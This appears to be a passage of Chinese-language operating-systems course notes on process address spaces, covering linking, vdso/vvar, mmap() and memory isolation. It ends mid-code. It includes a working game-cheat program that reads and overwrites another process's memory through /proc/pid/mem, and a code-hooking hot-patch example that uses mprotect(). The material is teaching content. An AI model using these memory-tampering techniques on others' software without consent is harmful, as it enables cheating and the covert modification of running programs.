<h3 id="Statically-Link"><a href="#Statically-Link" class="headerlink" title="Statically Link"></a>Statically Link</h3><p>我们尝试查看一个静态链接的二进制文件 (空 main() 函数编译得到) 的地址空间：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0000000000400000      4K r---- a.out</span><br><span class="line">0000000000401000    560K r-x-- a.out</span><br><span class="line">000000000048d000    160K r---- a.out</span><br><span class="line">00000000004b5000     16K r---- a.out</span><br><span class="line">00000000004b9000     12K rw--- a.out</span><br><span class="line">00000000004bc000    140K rw---   [ anon ]</span><br><span class="line">00007ffff7ff9000     16K r----   [ anon ]</span><br><span class="line">00007ffff7ffd000      8K r-x--   [ anon ]</span><br><span class="line">00007ffffffde000    132K rw---   [ stack ]</span><br><span class="line">ffffffffff600000      4K --x--   [ anon ]</span><br><span class="line"> total             1052K</span><br></pre></td></tr></table></figure>

<p>可以看到的地址空间的内容更加丰富。第一个段是 ELF header，后面的可读可执行段是代码段，再后面有只读数据段等等。我们可以将其和 ELF 文件的 program header 进行对比：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000</span><br><span class="line">                 0x0000000000000528 0x0000000000000528  R      0x1000</span><br><span class="line">  LOAD           0x0000000000001000 0x0000000000401000 0x0000000000401000</span><br><span class="line">                 0x000000000008bf1d 0x000000000008bf1d  R E    0x1000</span><br><span class="line">  LOAD           0x000000000008d000 0x000000000048d000 0x000000000048d000</span><br><span class="line">                 0x0000000000027315 0x0000000000027315  R      0x1000</span><br><span class="line">  LOAD           0x00000000000b4908 0x00000000004b5908 0x00000000004b5908</span><br><span class="line">                 0x00000000000059e8 0x00000000000072b8  RW     0x1000 </span><br></pre></td></tr></table></figure>

<p>可以看到地址和权限都能对应上。计算机系统的世界里没有魔法。</p>
<h3 id="Dynamically-Link"><a href="#Dynamically-Link" class="headerlink" title="Dynamically Link"></a>Dynamically Link</h3><p>动态链接的结果会更复杂一些：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">555555554000-555555555000 r--p  103:0a  /home/starling/a.out</span><br><span class="line">555555555000-555555556000 r-xp  103:0a  /home/starling/a.out</span><br><span class="line">555555556000-555555557000 r--p  103:0a  /home/starling/a.out</span><br><span class="line">555555557000-555555558000 r--p  103:0a  /home/starling/a.out</span><br><span class="line">555555558000-555555559000 rw-p  103:0a  /home/starling/a.out</span><br><span class="line">7ffff7dbe000-7ffff7dc0000 rw-p  00:00 0  // ???</span><br><span class="line">7ffff7dc0000-7ffff7de6000 r--p  103:09  /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="line">7ffff7de6000-7ffff7f51000 r-xp  103:09  /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="line">7ffff7f51000-7ffff7f9d000 r--p  103:09  /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="line">7ffff7f9d000-7ffff7fa0000 r--p  103:09  /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="line">7ffff7fa0000-7ffff7fa3000 rw-p  103:09  /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="line">7ffff7fa3000-7ffff7fae000 rw-p  00:00 0  // ???</span><br><span class="line">7ffff7fc3000-7ffff7fc7000 r--p  00:00 0 [vvar]</span><br><span class="line">7ffff7fc7000-7ffff7fc9000 r-xp  00:00 0 [vdso]</span><br><span class="line">7ffff7fc9000-7ffff7fca000 r--p  103:09  /usr/lib/x86_64-linux-gnu/ld-2.33.so</span><br><span class="line">7ffff7fca000-7ffff7ff1000 r-xp  103:09  /usr/lib/x86_64-linux-gnu/ld-2.33.so</span><br><span class="line">7ffff7ff1000-7ffff7ffb000 r--p  103:09  /usr/lib/x86_64-linux-gnu/ld-2.33.so</span><br><span class="line">7ffff7ffb000-7ffff7ffd000 r--p  103:09  /usr/lib/x86_64-linux-gnu/ld-2.33.so</span><br><span class="line">7ffff7ffd000-7ffff7fff000 rw-p  103:09  /usr/lib/x86_64-linux-gnu/ld-2.33.so</span><br><span class="line">7ffffffde000-7ffffffff000 rw-p  00:00 0 [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall]</span><br></pre></td></tr></table></figure>

<p>我们看到多了很多的段，比如 libc 库的段和加载器的段。可以引起我们关注的一个问题是：有两个没有名字的东西是什么？这两个段可读可写不可执行，是否有可能是 bss 段？我们可以做实验验证这一点：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> ch[<span class="number">1</span> &lt;&lt; <span class="number">30</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>再次运行并查看，可以看到没有名字的段变大了很多。再做一次实验：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> ch[<span class="number">1</span> &lt;&lt; <span class="number">30</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这次编译变慢了很多，生成的可执行文件非常大。查看地址空间，匿名段上方多了一个很大的段，显然是可读可写数据段，匿名段的大小很小。因此我们可以确定没有名字的段就是 bss 段。</p>
<p>另外一个有意思的问题是：vvar 段和 vdso 段是什么？</p>
<p>我们有时候想要执行系统调用，但又不想陷入操作系统内核 (因为这样比较耗时)，vdso 提供了这样一些不陷入内核就可以完成系统调用功能的函数。一个典型的例子是 <code>__vdso_gettimeofday()</code>。在使用时，我们并不需要加上 <code>__vdso</code> 的前缀，编译器会自动帮我们链接到 vdso 函数。下面是一个例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vdso.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">gettime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">t</span>;</span></span><br><span class="line">  gettimeofday(&amp;t, <span class="literal">NULL</span>); <span class="comment">// trapless system call</span></span><br><span class="line">  <span class="keyword">return</span> t.tv_sec + t.tv_usec / <span class="number">1000000.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Time stamp: %ld\n&quot;</span>, time(<span class="literal">NULL</span>)); <span class="comment">// trapless system call</span></span><br><span class="line">  <span class="keyword">double</span> st = gettime();</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">double</span> ed = gettime();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Time: %.6lfs\n&quot;</span>, ed - st);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>vdso.c</code> 中调用了函数 time() 和 gettimeofday()，它们都不会陷入内核。我们可以用 GDB 调试它并查看汇编代码。我们发现 time() 函数的从一个奇怪的地方搬了一些数过来，这些数就构成了时间：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffff7fc7c00 &lt;time&gt;:      lea    -0x4b87(%rip),%rax               # 0x7ffff7fc3080</span><br><span class="line">0x7ffff7fc7c07 &lt;time+7&gt;:    lea    -0x1b8e(%rip),%rdx               # 0x7ffff7fc6080</span><br><span class="line">0x7ffff7fc7c0e &lt;time+14&gt;:   cmpl   $0x7fffffff,-0x4b94(%rip)        # 0x7ffff7fc3084</span><br><span class="line">0x7ffff7fc7c18 &lt;time+24&gt;:   cmove  %rdx,%rax</span><br><span class="line">0x7ffff7fc7c1c &lt;time+28&gt;:   mov    0x20(%rax),%rax</span><br><span class="line">0x7ffff7fc7c20 &lt;time+32&gt;:   test   %rdi,%rdi</span><br><span class="line">0x7ffff7fc7c23 &lt;time+35&gt;:   je     0x7ffff7fc7c28 &lt;time+40&gt;</span><br><span class="line">0x7ffff7fc7c25 &lt;time+37&gt;:   mov    %rax,(%rdi)</span><br><span class="line">0x7ffff7fc7c28 &lt;time+40&gt;:   ret </span><br></pre></td></tr></table></figure>

<p>如果我们在 GDB 中直接用 <code>x</code> 指令打印那个地址，会发现我们无权访问 (GDB 不允许我们访问另一个进程的地址空间)，但对照 <code>/proc/pid/maps</code> 的结果，我们可以看到 time() 函数在 vdso 段，它所抓取的数据在 vvar 段。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">7ffff7fc3000-7ffff7fc7000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7fc7000-7ffff7fc9000 r-xp 00000000 00:00 0                          [vdso]</span><br></pre></td></tr></table></figure>

<p>该虚拟系统调用实现的原理不太复杂：操作系统在 vvar 段维护一个大致时间的变量，每过一会儿去更新一下，系统中所有的进程都可以使用 vvar 段的数据。</p>
<h2 id="Managing-Address-Space"><a href="#Managing-Address-Space" class="headerlink" title="Managing Address Space"></a>Managing Address Space</h2><p>进程的地址空间不是一成不变的，在进程执行过程中可以修改。如果我们用 GDB 调试一个动态链接的程序，用 starti 让其暂停在第一条汇编指令 (此时 PC 在加载器中)，再用 pmap 查看地址空间，可以看到此时只有 .so，还没有 libc 相关的段。但执行到 main() 函数时，地址空间中有了 libc 相关的段。</p>
<p>增加/删除/修改地址空间需要系统调用的支持。Linux 提供了 mmap() 系统调用添加映射，munmap() 系统调用删除映射，mprotect() 函数修改映射的权限。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>

<p>手册中有对 mmap() 的详细描述，比如 addr 本身并不指定 mmap() 映射的地址，只会作为一个映射地址的参考；该函数返回的地址是实际映射的地址。有意思的一点是，mmap() 可以直接将文件中的一大块区域映射到地址空间中：事实上文件并不会被立刻搬入内存，而是在使用时才会将要使用的部分搬进来 (缺页异常)。(注：如果不想映射到文件，而只是开辟一段映射空间，可以在 flags 字段使用 MAP_ANONYMOUS，并将 fd 设置为 -1，操作系统会自动将这段填充为 0。)</p>
<p>有了 mmap() 系统调用以后，操作系统的加载器变得非常好写：我们只需要根据 ELF 文件中所写的需要加载的内容一一调用 mmap() 即可。我们可以用 strace 观测一个程序加载、运行时的所有 mmap() 操作。</p>
<p>有了文件映射之后，随之而来的是一系列一致性问题：进程对文件的修改是否需要立即生效？不同进程映射到同一个文件应当共享内存还是各自有本地副本？操作系统还提供了 msync() 系统调用处理同步相关的问题。这才是系统真正的复杂性。</p>
<p>下面是两个 mmap() 的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mmap-alloc.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GiB * (1024LL * 1024 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">uint8_t</span> *p = mmap(<span class="literal">NULL</span>, <span class="number">3</span> GiB, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap: %lx\n&quot;</span>, (<span class="keyword">uintptr_t</span>)p);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">intptr_t</span>)p == <span class="number">-1</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;cannot map&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(<span class="keyword">int</span> *)(p + <span class="number">1</span> GiB) = <span class="number">114</span>;</span><br><span class="line">  *(<span class="keyword">int</span> *)(p + <span class="number">2</span> GiB) = <span class="number">514</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Read get: %d\n&quot;</span>, *(<span class="keyword">int</span> *)(p + <span class="number">1</span> GiB));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Read get: %d\n&quot;</span>, *(<span class="keyword">int</span> *)(p + <span class="number">2</span> GiB));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们用 mmap() 映射了一点 3G 的内存空间，并在其中某个位置写了东西，并访问这个位置。我们可以看到虽然我们映射了很大的一块空间，但这个系统调用只用了极短的时间 (一些延迟映射相关的技术)。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mmap-disk.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> mmap, hexdump</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/dev/sda&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    mm = mmap.mmap(fp.fileno(), prot=mmap.PROT_READ, length=<span class="number">128</span> &lt;&lt; <span class="number">30</span>)</span><br><span class="line">    hexdump.hexdump(mm[:<span class="number">512</span>])</span><br></pre></td></tr></table></figure>

<p>我们可以将整个磁盘映射到地址空间中，并打印第一个扇区的内容，可以看到结尾处标志 MBR 的 0x55aa。</p>
<h2 id="Isolation-of-Address-Space"><a href="#Isolation-of-Address-Space" class="headerlink" title="Isolation of Address Space"></a>Isolation of Address Space</h2><p>虚拟内存机制为我们提供了内存隔离：每个进程只能在自己的地址空间映射中做事，访问别的进程的地址会触发段错误，或者说，在本地的地址空间中根本看不到别的进程的地址。（真的吗？）</p>
<h3 id="Jinshan-Drifter"><a href="#Jinshan-Drifter" class="headerlink" title="Jinshan Drifter"></a>Jinshan Drifter</h3><p>在访问检查不严格的程序中，其他进程有办法可以侵入，读取和修改数据。这里展示一个类似于“金山游侠”的红警外挂程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH(arr)  (sizeof(arr) / sizeof(arr[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, fd, pid;</span><br><span class="line"><span class="keyword">uint64_t</span> found[<span class="number">4096</span>];</span><br><span class="line"><span class="keyword">bool</span> reset;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scan</span><span class="params">(<span class="keyword">uint16_t</span> val)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uintptr_t</span> start, kb;</span><br><span class="line">  <span class="keyword">char</span> perm[<span class="number">16</span>];</span><br><span class="line">  FILE *fp = popen(<span class="string">&quot;pmap -x $(pidof dosbox) | tail -n +3&quot;</span>, <span class="string">&quot;r&quot;</span>); assert(fp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (reset) n = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%lx&quot;</span>, &amp;start) == <span class="number">1</span> &amp;&amp; (<span class="keyword">intptr_t</span>)start &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    assert(<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%ld%*ld%*ld%s%*[^\n]s&quot;</span>, &amp;kb, perm) &gt;= <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (perm[<span class="number">1</span>] != <span class="string">&#x27;w&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uintptr_t</span> size = kb * <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(size); assert(mem);</span><br><span class="line">    assert(lseek(fd, start, SEEK_SET) != (<span class="keyword">off_t</span>)<span class="number">-1</span>);</span><br><span class="line">    assert(read(fd, mem, size) == size);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i += <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">uint16_t</span> v = *(<span class="keyword">uint16_t</span> *)(&amp;mem[i]);</span><br><span class="line">      <span class="keyword">if</span> (reset) &#123;</span><br><span class="line">        <span class="keyword">if</span> (val == v &amp;&amp; n &lt; LENGTH(found)) found[n++] = start + i;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">	      <span class="keyword">if</span> (found[j] == start + i &amp;&amp; v != val) found[j] = <span class="number">0</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">  &#125;</span><br><span class="line">  pclose(fp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (found[i] != <span class="number">0</span>) s++;</span><br><span class="line">  &#125;</span><br><span class="line">  reset = <span class="literal">false</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;There are %d match(es).\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overwrite</span><span class="params">(<span class="keyword">uint16_t</span> val)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    <span class="keyword">if</span> (found[i] != <span class="number">0</span>) &#123;</span><br><span class="line">      assert(lseek(fd, found[i], SEEK_SET) != (<span class="keyword">off_t</span>)<span class="number">-1</span>);</span><br><span class="line">      write(fd, &amp;val, <span class="number">2</span>);</span><br><span class="line">      s++;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d value(s) written.\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  FILE *fp = popen(<span class="string">&quot;pidof dosbox&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  assert(<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d&quot;</span>, &amp;pid) == <span class="number">1</span>);</span><br><span class="line">  pclose(fp);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/mem&quot;</span>, pid);</span><br><span class="line">  fd = open(buf, O_RDWR); assert(fd &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (reset = <span class="literal">true</span>; !feof(<span class="built_in">stdin</span>); ) &#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(DOSBox %d) &quot;</span>, pid);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf) &lt;= <span class="number">0</span>) &#123; close(fd); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line">    <span class="keyword">switch</span> (buf[<span class="number">0</span>]) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>: close(fd); <span class="built_in">exit</span>(<span class="number">0</span>); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>: <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;val); scan(val); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>: <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;val); overwrite(val); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>: reset = <span class="literal">true</span>; <span class="built_in">printf</span>(<span class="string">&quot;Search results reset.\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>popen() 函数的声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">popen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *command, <span class="keyword">const</span> <span class="keyword">char</span> *type)</span></span>;</span><br></pre></td></tr></table></figure>

<p>它的作用是创建一个管道，fork 当前进程，并执行 shell 命令 command。type 字段指示了管道的数据流向，“r” 表示当前进程从管道读取 command 的输出，”w” 表示当前进程通过管道向 command 输出。</p>
<p>main() 函数的主要工作是</p>
<ul>
<li>利用 popen() 执行命令 <code>pidof dosbox</code>，获得正在运行的 dosbox 进程的进程号，并用 open() 函数打开该进程下的一个文件 <code>/proc/pid/mem</code>，获得一个文件描述符 (open() 中的权限要设置为可读可写，因为我们既要读取游戏信息，又要修改数据)。根据 proc 的手册，我们可以通过这个文件访问该进程的地址空间信息。</li>
<li>不断从 stdin (控制台) 读取用户输入，对于 <code>s val</code> 型输入，在内存中尝试匹配所有的 val。对于 <code>w val</code> 型输入，将之前匹配到的所有位置改写为 val。对于 <code>r</code> ，重置之前的匹配结果，对于 <code>q</code>，退出外挂程序。</li>
</ul>
<p>scan() 函数负责在 dosbox 的地址空间中匹配所有的 val，其具体工作是：</p>
<ul>
<li>利用 popen() 执行命令 <code>pmap $(pidof dosbox) | tail -n +3</code>，<code>tail -n +3</code> 可以指定从 pmap 输出结果的第 3 行开始读取。pmap 输出的第一行通常是进程号，第二行是 ELF 文件头，因此从第 3 行开始处理。</li>
<li>while () 循环访问 dosbox 地址空间的所有可读可写段 (游戏中值得关注的数据，例如金钱、资源，一定是可以修改的)，访问这些段中的每个地址，看其是否等于 val 并修改 found[] 数组。found[] 数组记录了上一次 reset 以来满足所有匹配结果的地址。</li>
</ul>
<p>overwrite() 函数负责修改数据。它只要将 found[] 中所有地址处的数据改成我们想要的 val 即可。</p>
<p>这个外挂需要动态使用：外挂刚开始也不知道存储金钱的地址在哪里，但我们可以不断花钱，并拿新的钱的剩余量去 scan，做若干轮之后我们就可以锁定金钱的地址。此时再修改该地址的值，便可以拥有钞能力。</p>
<h3 id="Pseudo-hardware"><a href="#Pseudo-hardware" class="headerlink" title="Pseudo-hardware"></a>Pseudo-hardware</h3><p>有一些类似 “2秒17枪” 的外挂可以以人类无法达到的速度大量重复执行任务。这类外挂可以通过写一个驱动模仿假的硬件，或者利用操作系统/窗口管理器的 API 实现。</p>
<h3 id="Variable-Speed-Gear"><a href="#Variable-Speed-Gear" class="headerlink" title="Variable Speed Gear"></a>Variable Speed Gear</h3><p>变速齿轮是另外一类常见的外挂，可以调节游戏的进度 (比如加快动画播放的速度，减小延迟等)。其实现的机制通常和代码注入有关：我们需要找到类似于 gettimeofday() 等时间相关 API 的函数位置，然后改写这部分代码，让它跳转到我们自己编写的函数，这样就可以任意调节时间了。</p>
<h3 id="Hooking"><a href="#Hooking" class="headerlink" title="Hooking"></a>Hooking</h3><p>我们不仅可以修改数据，还可以修改代码，这就是代码注入技术 (hooking)。下面是一个简单的给程序打热补丁 (dynamic software update) 的示例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span>     </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;In old function %s\n&quot;</span>, __func__); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo_new</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;In new function %s\n&quot;</span>, __func__); &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">jmp</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint32_t</span> opcode: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">int32_t</span>  offset: <span class="number">32</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JMP(off) ((struct jmp) &#123; 0xe9, off - sizeof(struct jmp) &#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_SIZE sysconf(_SC_PAGESIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">within_page</span><span class="params">(<span class="keyword">void</span> *addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">uintptr_t</span>)addr % PG_SIZE + <span class="keyword">sizeof</span>(struct jmp) &lt;= PG_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DSU</span><span class="params">(<span class="keyword">void</span> *old, <span class="keyword">void</span> *<span class="keyword">new</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *base = (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)old &amp; ~(PG_SIZE - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">size_t</span> len = PG_SIZE * (within_page(old) ? <span class="number">1</span> : <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">int</span> flags = PROT_WRITE | PROT_READ | PROT_EXEC;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Dynamically updating...\n&quot;</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mprotect(base, len, flags) == <span class="number">0</span>) &#123;</span><br><span class="line">    *(struct jmp *)old = JMP((<span class="keyword">char</span> *)<span class="keyword">new</span> - (<span class="keyword">char</span> *)old); <span class="comment">// **PATCH**</span></span><br><span class="line">    mprotect(base, len, flags &amp; ~PROT_WRITE);</span><br><span class="line">  &#125; <span 